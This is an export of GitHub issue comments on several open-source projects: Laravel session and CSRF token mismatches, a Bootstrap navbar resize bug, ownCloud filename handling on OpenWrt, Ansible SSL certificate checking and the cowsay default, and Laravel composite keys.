framework/laravel/8172/104889251,8172,"Nobody is denying the problem is real. If you are repeatedly changing the session on each GET request, you're going to possibly get stale data. The only way around that is to makes the sessions totally blocking, which we don't want to do, or to tweak your app to not write to sessions on idempotent requests like GET. On Saturday, May 23, 2015, Ala RIHANE notifications@friend.com wrote ",,False
framework/laravel/8172/104889362,8172,"No, I'm not changing anything on  request. I just read data and output it. Session in changed on  request which I hit only once while replicating issue. ",,False
framework/laravel/8172/104889411,8172,"What do you mean session is changed? If you do a set request but a get request starts before that request AND then finished after the set, the get request is going to write the stale data back to the session. On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote ",,False
framework/laravel/8172/104900297,8172,"@friend ""session is changed"" I mean value of a key in session is changed. So that's the problem. I'll paste the code @friend posted in Slack chat yesterday So the problem is that session data is being written back at the end on every request, whether or not session data was changed. So the only fix would be to write back session data only if session data was changed during current request. Note The problem will still occur if we re-read session data at the end of the session. It will see data was changed - it will compare newly read data to one that we read at the beginning, so it will still write back stale data. We should write back session data, only if  (or any other method that changes session data) was called. As @friend says, it will make the expiration stuff complicated. So at this moment I don't know how to avoid this problem. ",,False
framework/laravel/8172/104915942,8172,"I understand that expiration stuff can become a problem when session is saved only on change. For year's (before Laravel) I've been using this solution in our company framework. It was used on pages with big traffic, and we didn't experience any problem with sessions being expired due not saving any data to it. I think that this is a risk worth taking. ",,False
framework/laravel/8172/104920984,8172,"It is sort of a problem though. If I log into the site and I work in the app all day. I don't want to be logged out every two hours just because my session hasn't changed. That's silly. On Saturday, May 23, 2015, Radosław Mejer notifications@friend.com wrote ",,False
framework/laravel/8172/104936713,8172,"And what about the touch() function? Would that still corrupt the file? It would prevent the session going stale, right? if ($dataChanged) {     writeSession(); } else {     touchSession(); }  Or take the time into consideration, only update once a minute? if ($dataChanged || $secsAgoChanged &gt; 60) {     writeSession(); }  Or combine both? if ($dataChanged ) {     writeSession(); } elseif ($secsAgoChanged &gt; 60) {     touchSession(); }  ",,False
framework/laravel/8172/104937536,8172,"The seconds thing will be error prone. To me it makes more sense to just evaluate why is the session changing in s particular app and perhaps structure your AJAX calls to where they aren't going to be going in between set requests for the same session. Perhaps use a cookie to store a piece of data, etc On Saturday, May 23, 2015, Barry vd. Heuvel notifications@friend.com wrote ",,False
framework/laravel/8172/104939683,8172,@friend What about long-polling? It will screw up thing if someone has long-polling implemented in app. ,,False
framework/laravel/8172/104939712,8172,"What will screw up things? On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote ",,False
framework/laravel/8172/104939832,8172,"This issue. I mean if you change anything in session data, long-polling requests will overwrite stale data to session as each polling request will take up to 40 seconds. ",,False
framework/laravel/8172/104940328,8172,"I mean there are several options there. You could send a custom header, check for that header, and then override the session middleware. That's just off the top of my head. I'm not sure of a really great solution that works well in every situation. On Sat, May 23, 2015 at 257 PM, Levan Velijanashvili  notifications@friend.com wrote ",,False
framework/laravel/8172/104941503,8172,Also worth mentioning that the near-term future of bidirectional communication likely won't include long-polling unless your app needs to support IE9. ,,False
framework/laravel/8172/104948114,8172,"I'm not sure I fully understand the ""expiration"" problem, but if it's a case that the session must save at certain intervals to avoid being logged out, how about using the garbage collection/lottery approach to save the session occasionally? Or maybe just add a session save in the ""gc"" function of the session handler? ",,False
framework/laravel/8172/105001530,8172,"@friend when it comes to long-polling it's a big problem, I used to store data from Session data while there is a long-polling ajax request, the Session forget even in the same request, so we suitched to cookies so we didn't faced this problem anymore. ",,False
framework/laravel/8172/106015931,8172,Same issue here running L5 on PHP 5.6.9. - TokenMismatchException VerifyCsrfToken.php on line 46 - on every post request. Works fine on PHP 5.4. ,,False
framework/laravel/8172/106107793,8172,We are running it on PHP 5.5.24-1 ,,False
framework/laravel/8172/106216308,8172,"@friend  Yea, it happens because Session is re-initialized on every request (make sure you have set the domain-name setting in  btw). ",,False
framework/laravel/8172/109907029,8172,"We have exactly the same problem. Weird thing is we can not reproduce it ourselves but we have Bugsnag installed and see the tokenmismatch exception pop-up twice per minute or so, completely random. Random users, random computers, random browsers. Only thing in common is that it where all ajax calls. Seems like about 0,1% of all ajax calls return a token mismatch exception, all the ajax calls suffer from this. I know that it has nothing to do with a session expiring because we have one ajax call which is only loaded first thing when a page loads and even this ajax call will return a tokenmismatch exception about 0,1% of the time, again completely random but here at our office we can not reproduce it. If somebody wants access to the Bugsnag report, I can give you that for investigation purposes. Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) Latest Laravel 5.0.x Website www.studocu.com We used to have 1 AWS redis node for both the cache and sessions. Today we tried separating the 2 and moved the session part to a newly setup memcached node, but this didn't make a difference and the problem still exists. ",,False
framework/laravel/8172/110199902,8172,"Experiencing this issue with a fresh install of Laravel 5 on a recently provisioned Ubuntu 15.04 server. No matter what route, it's always a token mismatch. Tried both file and database session drivers. I'd be willing to let @friend or @friend or someone else into the server to poke around and see if they can figure it out. ",,False
framework/laravel/8172/110202710,8172,@friend -You have a complete session failure - which is a different issue to this thread. Please post that issue in a forum for assistance. ,,False
framework/laravel/8172/110356600,8172,"Can people stop abusing this thread and actually read it, and only comment if they have something useful to say. ",,False
framework/laravel/8172/110638834,8172,"@friend Was this comment meant for me? If so, how can I provide more information? ",,False
framework/laravel/8172/110643354,8172,"@friend Open independent issue for your case, because it is not related to this one (this one = random, unpredictable and untraceable session failures [0.1-0.3% occurrence rate]). ",,False
framework/laravel/8172/110650207,8172,"@friend Did you even read my report? I'll quote myself ""Seems like about 0,1% of all ajax calls return a token mismatch exception, all the different ajax calls suffer from this. Random users, random computers, random browsers"". This is caused by a random, unpredictable and untraceable session failure and thus a session regeneration causing random (0,1% of all) ajax calls to return a tokenmismatch. ",,False
framework/laravel/8172/112219227,8172,"I had a problem with persisting sessions. (Not sure if its related to this problem). The first time I installed Laravel via installer, then I had problems running phpunit and the weird session persisting problem. Then I reinstalled Laravel via composer and now everything works as expected. Perhaps its a bug in the installer. ",,False
framework/laravel/8172/113196198,8172,"I had a problem with session persistence only on live server, but I solved it. The problem was in blank space after php closing tag in my Profile model which I using  for authentication. After I removed it everything is work now. ",,False
framework/laravel/8172/113197652,8172,"That is totally unrelated! Also, you should not use php closing tags for that reason. ",,False
framework/laravel/8172/113757281,8172,Been following this thread for a while hoping for a solution. I just bumped into a situation which might be related to this. (Using the database session driver) Accidentally I put a wrong route for a form and when I submitted I obviously got a TokenMismatch even on valid routes from time to time on fast AJAX requests or situations where there been many concurrent requests. And after that I've seen this NotFoundHttpException the second time on submitting a form to an invalid route instead of a Not Found page. Is that expected behavior? ,,False
framework/laravel/8172/113769854,8172,"CSRF token checks run as part of the global middleware, before you reach the routes. So an invalid CSRF will trigger an exception, regardless of the url. ",,False
framework/laravel/8172/113786836,8172,"Yeah I got that, just didn't understand why a csrf exception was triggered after a not found exception the first time. ",,False
framework/laravel/8172/113870603,8172,Ok figured that whenever hit a NotFoundHttpExceptionTokenMismatchException♠` is triggered. Is it necessary to clear the session / regenerate the token if a route is not found? ,,False
framework/laravel/8172/114047380,8172,"Hi! I have the same problem. The session of my app expired when I do new request. In a local environment that's fell good but in a real hosting the session expires randomly, someone have some hint? ",,False
framework/laravel/8172/114053044,8172,I started getting this today after several days of development. Laravel 5.1 Windows 8.1 Google Chrome Version 43.0.2357.124 m PHP Version 5.6.8 Notable information  Only happens on my Chrome browser (Tested latest IE and latest FF) It happens in incognito mode as well I get the error more often than not (About 90% of the time I submit a form) It does not appear to have anything to do with the frequency of form submissions It happens in both prod and local APP_ENV  ,,False
framework/laravel/8172/114091231,8172,"I have the same problem and here is how i'm tested and fixed the problem. First, i knew i have some 404 ajax and resources ( javascripts ) on my site. So I logged on the site, and put four tabs opened with my site in firefox. The Firefox has a nice tool called ""Reload all tabs"". So I did it and with a few refresh all tabs I get logout. Then, I removed all 404 requests and tried again, and, after 20 attempts, no logouts from now. ",,False
framework/laravel/8172/114099220,8172,"@friend I don't know why it works sometimes, but when I get 'the error' it's because the form is sending a different (Seemingly random) token than what is stored in the session. Are you sure this is not the same issue? ",,False
framework/laravel/8172/114099464,8172,"@friend so it's expected behaviour for session and token to get refreshed after a 404? Any reason for that being necessary or that just the way it's made? And some times a 404 is triggered even on valid routes? That's what seems to happen in my environment randomly...it's actually first a ""Whoops something went wrong...notfoundexception"" followed by tokenmismatch...on fast ajax requests...and hence guessed that this could be issue others are facing..and just wanted a way to ensure that even if 404 did come about, the token does not get refreshed...is there any way to ensure that  it doesn't get refreshed on 404 then my problem will be solved at least ;) because I can't figure why I get a notfound sometimes on valid routes, it's rare but happens and then it results in this tokenmismatch.... ",,False
framework/laravel/8172/114117821,8172,"@friend What? Why would your session get refreshed after a 404? This is not true, and I've just confirmed in a clean install. Also, that would be a horrible user experience, because users would basically be logged out after visiting a missing page. ",,False
framework/laravel/8172/114127648,8172,"@friend Sorry my bad, was getting frustrated about everybody just commenting their issues in here. Of-course a 4xx will not refresh your session. I do not have any reponses other then 200, I do not have concurrent and high frequency ajax calls. No exceptions are being thrown (we log everything on bugsnag). Still once in a while, about 0,1%, a request is returning a tokenmismatch caused by a regeneration of the session (i've actually logged this), not caused by session expiring or any thing like this. We have this problem both on Redis and Memcache. This is actually influencing the user experience on our website! Since this is only happening on our production environment (we can not reproduce the problem on develop or staging). I had to exclude all vital ajax routes from CSRF verification. Since nobody is interested in our bugsnag report or logs it kinda feels like nobody is working on this issue and people are only cluttering this thread with non related issues. This problem is actually costing us users and thus money and is kind of unacceptable. (it is the only laravel issue we are having btw, everything else works like a charm and is awesome!) ",,False
framework/laravel/8172/114135568,8172,"@friend - what exactly is your production environment config? i.e .server, os, php version etc? ",,False
framework/laravel/8172/114140093,8172,@friend Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) PHP 5.6.8 Apache 2.4.12 Latest Laravel 5.0.x Website www.studocu.com Weird thing is we have a replica of this setup for staging and we can not reproduce it there as well. I guess with just 7 dev's working on staging we do not have enough ajax calls to get a single error. On production though we hundreds of users online at the same second. ,,False
framework/laravel/8172/114141996,8172,@friend - so here is an idea; Can you 'duplicate' that AWS environment? Put a copy of your app on it - and confirm the bug still occurs? Then - if you are trusting enough - could you give @friend access and the steps to reproduce (if he is open to the idea - I'm just putting it out there). The biggest issue is the difficulty in replicating the issue. So far we've not been able to get access to an environment where we can duplicate it. I've tried on different cloud providers - and I cant seem to get it to trigger... ,,False
framework/laravel/8172/114146210,8172,"@friend - I willing to give it a go, but I don't think it will work. Our staging environment is a duplicate of our production. Like I said before, we can not reproduce the bug ourselves (on both production or staging). The only thing that makes this bug visible is a high user volume website and Bugsnag. I'm guessing more applications suffer from this but they don't even know it. It is only happening about once or twice per hour (random calls, random routes, random users) versus thousands of successful requests. ",,False
framework/laravel/8172/114148794,8172,Can you try hitting your staging site with a load tester - like  - can that trigger it? ,,False
framework/laravel/8172/114166199,8172,"@friend I doubt that, all our ajax requests are user induced. I should build in a custom ajax request then, which basically does nothing but will load on various times. ",,False
framework/laravel/8172/114194201,8172,Same problem here. Randomly. TokenMismatchException line 46. Happens with IE Win8.1 or IOS. Can't reproduce it. Simple form application (html+bootstrap+jqueryui) with default Laravel auth Session store in database Laravel 5.1 PHP 5.5.9 Apache 2.4 Cleared cache etc Session cookie gets reinit every request. Sow GET login page has other session then POST login page. ,,False
framework/laravel/8172/114260635,8172,"For me this problem went away when I updated my Homestead machine image from 0.2.6 to 0.2.7, destroyed my machine and recreated it. ",,False
framework/laravel/8172/114260875,8172,I solved my problem putting session_start() in the top of my routes file. ,,False
framework/laravel/8172/114408185,8172,"@friend I understand your frustration, just wanted to correct the wrong info, as it will only further confuse users reading this thread. I'm subscribed to the issue for the same reason as you - random token mismatch exceptions that cannot be reliably reproduced, though in a Laravel 4.2 app. I'm not posting extra info about my situation since it was mentioned that this issue is specifically concerned with Laravel 5, but I'm watching in case someone figures out the problem, because there's a good chance that the root cause might be similar. ",,False
framework/laravel/8172/114418687,8172,Oh wow. NEVER do that! ,,False
framework/laravel/8172/114419412,8172,why? That solved my problem ,,False
framework/laravel/8172/114419459,8172,Because that's totally incorrect. ,,False
framework/laravel/8172/114419551,8172,Closing this as zero progress is being made. ,,False
framework/laravel/8172/114419620,8172,"Yes, I know but my desperation  is enough ",,False
framework/laravel/8172/114460406,8172,"@friend most people seem to experience this with Homestead. Whatever the issue is, updating homestead solved it on all my machines. BTW I could re-produce this with the most simple imaginable app that subits a form (no ajax). ",,False
framework/laravel/8172/114637404,8172,"Not sure how related this is, but I've been playing around with Lumen and with the new 5.1 release, I started migrating and noticed that my sessions kept regenerating on each request.  Tests work fine, but in browser, I couldn't keep a session.  I didn't have this problem w/ the Lumen 5.0 release. For me, it's not random as it is for some people here, it just doesn't keep the session. I updated Homestead to 0.2.7 hoping it would fix the issue, but no luck. I think Lumen is using Laravel's session class, hence posting here. ",,False
framework/laravel/8172/115361994,8172,I log the Exception header which show that de TokenMismatch mainly occurs on IE Win8.1 or IOS Safari. I can reproduce it in IE11 when i set the Privacy on High. solution that works here add a customheader in the middleware stack by create a file P3PHeader in App\Http\Middleware; And added 'App\Http\Middleware\P3PHeader' to $middleware in Kernel.php ,,False
framework/laravel/8172/115564735,8172,This is only an issue on my local machine and after running  i no longer see the issue ,,False
framework/laravel/8172/115569912,8172,"@friend This is looking very promising! For the first time I'm able to reproduce the error myself. Adding the headers like you suggested solved it for me, at least locally. I'm going to hotfix deploy this right away to production and monitor it for a couple of hours. Will be back with the results asap. ",,False
framework/laravel/8172/115863701,8172,"@friend Make sure you exclude responses that are redirects, otherwise it will throw an error ",,False
framework/laravel/8172/116624606,8172,"@friend @friend Tried both suggestions, random session regenerations still occurs. We are going to upgrade to L5.1 really soon, hopefully things will magically sort itself out. ",,False
framework/laravel/8172/116769777,8172,"@friend Do you use apache on your local machine? I run windows 8.1 and just switched to nginx and that also solved the issue for me, just like  did while using apache. ",,False
framework/laravel/8172/116772633,8172,Please continue this on the forums. ,,False
bootstrap/twbs/11243/21632511,11243,"The default navbar ( act a little bit weird when  I click dropdown (keep it opened) and then resize the browser until the navbar-toggle button appear, click it, open the dropdown and then maximize the browser. after those step, I can't open the dropdown on navbar default state.. ",,False
bootstrap/twbs/11243/27148522,11243,What browser are you using? Everything works well on Chrome. ,,False
bootstrap/twbs/11243/27150801,11243,"I'm using Google chrome. On my previous bootstrap 3 files, everything works fine, Until I sync it today and replace it (both unminified css &amp; js file). I'm glad I have a backup bootstrap files ) ",,False
bootstrap/twbs/11243/27595749,11243,This issue exists for us as well. Same browser. ,,False
bootstrap/twbs/11243/27596523,11243,"I think that found the thing causing the bug. No one of browsers can works in all test cases, but this is due to the viewport (dropdown forgets the place where should appear). @friend Please, don't try to kill your browser. This test case is too aggressive. ",,False
bootstrap/twbs/11243/27678213,11243,"I've got a trick to avoid the bug appearing when we maximize the browser. default bootstrap markup  the bug appear when we maximize the browser and we have  I've tried to change  class to . and it's works. bootstrap navbar is back to normal. in the end, we would have this markup when our browser is maximized  anyway, this is just a trick. my javascript skill is not yet able to fix this.. ( you can use  for resize event or anything else to manipulate the markup. hope this can solve our problem ) ",,False
bootstrap/twbs/11243/28167804,11243,we have the same issue on our site and fixed it by closing the collapse dropdown after resizing the browser through adding this javascript code we also use a good plugin for resizestop event ,,False
bootstrap/twbs/11243/28613088,11243,Or try to add ,,False
bootstrap/twbs/11243/29131049,11243,"When I add @friend (min-width 768px)  {  .navbar-collapse.in{ overflow-yvisible;} } ""navbar-right"" or ""pull-right"" doesn't work anymore. The solution of Nugrata works fine ",,False
bootstrap/twbs/11243/29179092,11243,@friend This problem happens for me using the latest Google Chrome. The finer points of this bug are not about the original navbar drop down but the collapsed navbar drop down. If that is up when you re enlarge the window it's fine. The bug only occurs after clicking on the little three lined icon if you then re enlarge the window while the revealed stacked navbar is still down. ,,False
bootstrap/twbs/11243/29180422,11243,Is this now the definitive thread and is there a definitive answer? ,,False
bootstrap/twbs/11243/29180429,11243,"Again, sorry @friend. This is an issue about Chrome's viewport resize, and things like this happens on many sites, undependent of framework (like Bootstrap). So, I think that this issue can be closed. How to fix it? Don't play games with your browser's viewport. ",,False
bootstrap/twbs/11243/29182443,11243,"@friend I disagree. If I write my website using the bootstrap system and any visitor of my site has a good reason to shrink the window for a while and later regrow the window they have a right to be alarmed and not accused of playing games with their viewport. It is a bug, and even though there may be workarounds, although it's not clear to me what the definitive workaround is, it's not fixed until it's fixed to everyone's satisfaction in a future version of bootstrap. ",,False
bootstrap/twbs/11243/29182822,11243,@friend That's all about viewport. You should report bug in Chrome bug tracker. ;) ,,False
bootstrap/twbs/11243/29183553,11243,"I think we have a misunderstanding here. The bug I'm referring to is the one I described in the thread that has been closed because it was assumed to be the same a this one. That bug happens exactly the same in Safari, Firefox and Chrome. It is not just a Chrome issue. It is more likely a bootstrap issue. Try the link above to issue #11603 and read my description of the issue. If these issues are at cross purposes perhaps we need to separate them. I originally assumed when it was pointed to me that my issue was a duplicate and that this issue was the same hence why am commenting here now. I think this is definitely a bug in bootstrap and not just a browser issue given that three distinct browsers repeat the same behaviour. ",,False
bootstrap/twbs/11243/29183727,11243,I'm not going to close this issue. ,,False
bootstrap/twbs/11243/29184084,11243,"@friend I don't know, but it looks like viewport issue (happens when resize window). I know that it can be fixed, but I don't think it's issue directly within Bootstrap. ",,False
bootstrap/twbs/11243/29184539,11243,@friend I didn't think you were going to close this thread. I was referring to the closure of #11603. @friend If you can show me a solution that you think works I'll try it out and see. ,,False
bootstrap/twbs/11243/29184828,11243,i don't have complete solution. I'm just avoiding window resizing games. smile ,,False
bootstrap/twbs/11243/29184929,11243,@friend I'm not finding your suggested solution that clear. I'm new to bootstrap. Would you mind perhaps expanding on what exactly to do and where in order to fix this problem. Right now I can't see the forest for the trees. ,,False
bootstrap/twbs/11243/29185097,11243,@friend It's not about what we're doing. We can't avoid what our web site clients are going to do. They are the ones who will get annoyed with our web sites and that's what concerns me. We can't in all seriousness post a directive on our home pages for users to not play silly whatsits with their windows. ,,False
bootstrap/twbs/11243/29186439,11243,"I added  as a possible solution. But @friend mentioned this will break ""navbar-right"" and / or ""pull-right"". ",,False
bootstrap/twbs/11243/29192969,11243,"What I thought is our problem come when we enlarge our browser but the  class within  is messing the navbar. so that  class got my attention. let's take a look the css file for a while.. I've found some  class related to our problem remembering that we have a trick to change  class to  and it works for me, so i'm interested with @friend (min-width 768px) block rules. Since the  class is our savior, I copied the rules and paste it on  rules. The result's look like this.. With this trick, the default Navbar is working perfectly when we enlarge our browser but we'll get a dropdown opened. I think that's not a big deal since our navbar is back to normal. Hope this trick can solve the problem once again. Please make sure you backed up your file first before trying this trick or you can use another css file to override the rules.. ",,False
bootstrap/twbs/11243/29201239,11243,"Everyone concerned about this should get a group of non-developer friends and do not tell them anything is ""wrong"" and see if they discover this. No regular user does this. If a user wants a window out of the way they click minimize. Most users slightly size down pages but if they do, they're not likely to size it down to see the mobile menu then click the toggle in the menu, pause and not click a link in the menu, but instead decide to re-size their page back up again. If it happens between flipping orientations, that's where the problem arises. That is a natural thing to do, even by accident, to click something in a menu, and then flip the device to landscape. ",,False
bootstrap/twbs/11243/29221873,11243,"Yup, that's it. 2013/11/25 carasmo notifications@friend.com --  Zlatan Vasović - ZDroid ",,False
bootstrap/twbs/11243/29222251,11243,"@friend Thanks. This works for me. I haven't noticed any side effects as yet, have you? An easy confusion in talking about this is that the navbar has a drop down menu in it. Then, when you shrink the window, the navbar itself becomes a drop down. You don't have to drop the drop down inside the dropped down navbar for this problem to happen. If you do, when you re enlarge the scroll bar is there already. With your fix, if you drop the inside drop down while in a shrunken window, it's still dropped when you re enlarge. I don't think that's a problem. If you were looking at it in the shrunken window, it's not a surprise when you re enlarge. I'm very happy with this now. I hope the developers will be too and that there are no side effects. ",,False
bootstrap/twbs/11243/29223025,11243,"@friend I disagree. I don't think you should make too many assumptions about ""regular"" users. It's clearly a bug and as such should be fixed, just in case. Let's say you're copying information from one window into another open app where a simple cut and paste is not an option and want these two views side by side. Sometimes shrinking both windows is the only option. And even if the majority of examples where a user was doing something like that might be able to be done another way without shrinking windows - we can't go around and reeducate them on an individual basis. And most people that get upset about stuff like that, don't complain and just go away. I don't want that happening on my web sites. ",,False
bootstrap/twbs/11243/29226216,11243,If only we could make open source projects from a user-centered design perspective. ,,False
bootstrap/twbs/11243/29227250,11243,"Won't change my mind. Shrinking both menus side by side and then copying pasting are different than deciding to toggle a menu and not click a link in that menu but then decide to just resize the page. Most people will refresh their browser if they happened to do that and discover that things have gone wonky. Hopefully this responsive crap will go away and all media queries will be min-device-width. I've done small menus where it doesn't even kick in unless that user comes to that site at the break point, not a single client says anything because the check their phone, works fine, check their desktop and tablet and it works fine. Just tell 'em it's adaptive, not responsive and move on. ",,False
bootstrap/twbs/11243/29244090,11243,"If you feel that way about responsive design why are you contributing to a responsive framework?  I think I am misunderstanding what the purpose of participating in the project is.  I thought it was to help build a better bootstrap, but after a day of auditing these issues it seems like it is more about reddit style bickering over opinions that really aren't germane to the issues. ",,False
bootstrap/twbs/11243/29246286,11243,@friend Exactly. You've cut straight to the chase. ,,False
bootstrap/twbs/11243/29247074,11243,"BS3 has the BEST grid system ever and the author's are geniuses. That is why. This stuff that regular users will not discover is simply not something that's important at all and after a month of seeing this thread, I just had to say something. I agree with the the test case being too aggressive. It's illogical. If it were a big deal or even a bug IMO, this thread would have more than 9 followers with 2 of them being team members. There would be a lot of plus ones. ",,False
bootstrap/twbs/11243/29247815,11243,Man I really don't get it.  I think I'll choose another project to contribute to. ,,False
bootstrap/twbs/11243/29248216,11243,"It is indeed an edge case, but one that seems fixable and one that IMHO ought to get fixed. ",,False
bootstrap/twbs/11243/29249975,11243,"@friend Why would you do that in response to one individual's opinion? The project itself is a worthy one. @friend I've been supporting various levels of computer user in a variety of contexts over many years and your supposition that a regular user wouldn't stumble on this flaw is just plain wrong. Many regular computer users get very quickly frustrated when software doesn't work as expected and generally being non technical, use software in ways that technical creators often won't appreciate. I may not be a regular user but I only just discovered bootstrap yesterday and this bug came up within a very short time of using it, I was simply checking that it was doing what it claimed to be doing. @friend I agree it's not a major bug but I, like Stephen did not expect to find myself having this discussion here. ",,False
bootstrap/twbs/11243/29250120,11243,"I picked 20 issues and read through the threads, started doing research to come up with my first fork.  I'm seeing this attitude across this entire repo.  I really, really like bootstrap and want to contribute, but maybe the popular repos are attracting the wrong crowd?  I don't know, I'm new to this so I think I'll be safer with a smaller project for my first go. ",,False
bootstrap/twbs/11243/29251138,11243,Out of curiosity are @friend and @friend contributors? There have been quite a few people interested in this issue. An initial problem was that this interest was spread out over 5 duplicated issues. ,,False
bootstrap/twbs/11243/29252153,11243,"Yes, I'm on the core team  has submitted a number of pull requests and legitimate bug reports. ",,False
bootstrap/twbs/11243/29263320,11243,"Firstly, I should mention that the OP issue occurs in both static and fixed navbars. A related issue that I'm not yet clear about is that the fixed navbar in collapsed form does not push content down when you drop it. Is that intended? Is it too hard to do otherwise because of its fixed state? Ideally I would like a top of the window navbar that stays fixed and visible at the top but pushes content down when you drop it in its collapsed state. ",,False
bootstrap/twbs/11243/29263869,11243,@friend Intended AFAIK. I think it's just the design choice that was made. I don't know if the alternative you're proposing was ever considered. ,,False
bootstrap/twbs/11243/29272245,11243,"I found a reason of bug. When you open a dropdown, resize window, uncollapse navbar, open dropdown and resize window again you'll get a  on . When remove that dummy  attribute you'll be able to see dropdown, again. ",,False
bootstrap/twbs/11243/29349419,11243,"I have spent many hours trying to figure out what is happening here, and I'm not on the core team, so it is definitely not a completely obscure thing that is unlikely to happen to real people. Hope it gets fixed in a future release. ",,False
bootstrap/twbs/11243/29363185,11243,"@friend If I found a real way to implement this fix, I'll send a pull request. ) ",,False
bootstrap/twbs/11243/29363666,11243,"Thank you @friend. I got a workaround on StackOverflow (with link to this thread), but I wish I did not have to spend so many hours trying to figure out what was going on. Hope it will help others, too. ",,False
bootstrap/twbs/11243/29548073,11243,Closing for #11653. ,,False
core/owncloud/2932/13192509,2932,"I have successfully installed OwnCloud 5.0.4 on WRT1043ND router running OpenWrt Attitude Adjustment 12.09-rc2 image. The only grave issue I had was inability to save and sync filenames with international characters. The problem stems to standard php basename() implementation which only works if setlocale can be set correctly to en_US.UTF-8. Unfortunately, many embedded systems, including OpenWRT and ddwrt, do not have locale support at all. Files and folders are created successfully on disk, but oc_filecache has [name] field populated incorrectly for example folder with full path ""/clientsync/яшерąčęéíñ"" is set with name ""clientsync"", a filename with full path ""/clientsync/яшерąčęéíñ.txt"" will become just "".txt"". As a result, Files web UI points to non existing path, and Sabre WebDAV has same issue propagated from /lib/connector/sabre/node.php, since file full path is reconstructed as folder name . ""/"" . [name]. After I have replaced the references to basename() function to my custom basename_safe() one in /lib/base.php, OwnCloud has started working without a hitch function basename_safe($path, $suffix=null) {     $path = rtrim($path,'/');     $path = explode('/',$path);     return end($path); } By the way, Sabre made a design choice not to use standard basename(), it has it's own solution for basename() Sabre_DAV_URLUtil-&gt;splitPath(). Is it possible to have a configuration variable, which would switch to alternative basename() implementation for the purpose of running OwnCloud on embedded systems? ",,False
core/owncloud/2932/16464864,2932,"locale support is essential and systems without it are not supported. Sorry we cant support all devices, but you can always send us a pull request ;) ",,False
ansible/ansible/17811/180080677,17811,"ISSUE TYPE  Bug Report  COMPONENT NAME vmware_inventory ANSIBLE VERSION CONFIGURATION OS / ENVIRONMENT SUMMARY ♠vmware_inventory` blindly accepts the SSL certificate at the moment - regardless of it being part of a genuine chain or a self signed cert. Convenient, possibly, but not the height of security. Really we should have an option to accept a certificate or not so people can decide their attitude to risk. STEPS TO REPRODUCE EXPECTED RESULTS Reject or accept connecting to vsphere over SSL based on an option. ACTUAL RESULTS Inventory script always connects, no matter what the certificate is. ",,False
ansible/ansible/10530/64088537,10530,"Having cows fill my screen when running a playbook is not the expected behavior, and makes it hard to visually parse the output of ansible. Since cowsay is enabled not by a setting, but just by the presence of the cowsay binary on the system, it is a surprise whether or not cows will appear when I run ansible-playbook on a new system. Instead of putting the burden of setting an environment variable on people who don't want cows, the default should be normal text output with no cows. The environment variable should be renamed from ""ANSIBLE_NOCOWS"" to ""ANSIBLE_COWS"". This way, we get a sane, unsurprising default, but people can still get their cows if they so desire. ",,False
ansible/ansible/10530/85674377,10530,"Pure heresy, I say!  wink ",,False
ansible/ansible/10530/85675108,10530,"I don't see what the problem is here. If you have cowsay installed, you obviously want to use it. If not, you'd uninstall it. ",,False
ansible/ansible/10530/116367283,10530,plus one I have a recurring nightmare of demoing a new CD system to all of engineering and having cows fill my screen and getting fired. ,,False
ansible/ansible/10530/117723140,10530,,,False
ansible/ansible/10530/117819151,10530,"Just wanted to point out one thing that I wasn't sure if the original poster noticed In ansible.cfg you can set if you would like to set this in your environment, just set the configuration option in the ansible.cfg file. ",,False
ansible/ansible/10530/117840301,10530,,,False
ansible/ansible/10530/374271097,10530,"I agree this is very annoying. I also think your attitude towards this very disappointing. Yes, this is a fun feature. But it's fun exactly three times, then you realize your ansible output is now basically unreadable. I can set it in a config file, yes, but when using e.g. a pull configuration, this isn't really an option. I have to ensure to enable an option in a config file on every host that might ever run some ansible command, just so I can get rid of some easter-egg I never even enabled in the first place. Isn't ansible supposed to make our lives easier? Maybe consider the fact that many people complain about it and even send PRs as a sign that this is annoying to many people, and please reconsider disabling it by default. ",,False
ansible/ansible/10530/382208517,10530,"Hay there. I'm moo here. I herd you mooved on, but cowbell we re-open this issue. Stop hoofing around, I think you've milked this joke long enhoof. Please remoove this behavior, I beg of you, leather you like it or not, it's caused issues even though there is no farm intended.  I was calfway through provisioning my EC2 servers and this bull appeared. But I digrass, this joke is the worst I'd heifer seen. It's the last straw. I've got no beef with you, but cattle you see that people are upset?  Please reconsider. Bessie of luck to you all. ",,False
ansible/ansible/10530/390709203,10530,A co-worker (not cow-orker!) suggested I weigh in on this thorny subject. ,,False
ansible/ansible/10530/392319998,10530,"You should be careful with features like this they can ruin product demonstrations if they fire off unexpectedly.  Many years ago I was demonstrating something in Linux.  I had to use sudo and I got one of the joke responses that it used to give when you mistyped your password.  'Oh yes, the err, author, does have a bit of an, um, sense of humour.'  It's unexpected so you've got nothing prepared, and it makes it look as though the product designers are not taking their role seriously.  I know that both Ansible and sudo are serious products, but my audience may not. ",,False
ansible/ansible/10530/393690519,10530,My biggest beef with this is that the beef takes way too much vertical space. Having it default to off would be preferred. ,,False
ansible/ansible/10530/393693359,10530,I see what you did there... ,,False
framework/laravel/5355/39602742,5355,"Eloquent assumes heavily that you are using surrogate keys on your tables (the  field in every table). However in real world usage, particularly older database systems not designed with web frameworks in mind, there are often tables with composite keys. That is, the primary key is over two or more columns. Often, you can't just add autoincremented id's. This is definitely a game stopper for a lot of use-cases, where you are forced to access existing RDBMS (e.g. building a frontend for an existing db). See also this reddit post about this issue. The schema builder has already support for composite keys, however eloquent doesn't seem to support it yet. I request the feature to use composite keys in your eloquent models and queries. The default configuration for surrogate keys is fine, just add the option. ",,False
framework/laravel/5355/51374218,5355,I would like to have this supported too. ,,False
framework/laravel/5355/51420165,5355,Me too. ,,False
framework/laravel/5355/52976163,5355,"I agree, this is extremely annoying at the moment. Unfortunately I'm not in charge of a lot of data I need to access. For the moment, I'm just overriding  in my models by doing something like ",,False
framework/laravel/5355/52988479,5355,@friend this is a good workaround. So did you specify  with one field and added the second field as a where-clause in the newQuery method? ,,False
framework/laravel/5355/53266220,5355,You could view my bug report (#5517) which has a work-around that works flawlessly for me. ,,False
framework/laravel/5355/53365455,5355,"@friend Yes, that is exactly what I did. In my case I was using a  and a bunch of child classes that extended my , so I had a  and a . ",,False
framework/laravel/5355/61826967,5355,I would really like to have this supported as well. ,,False
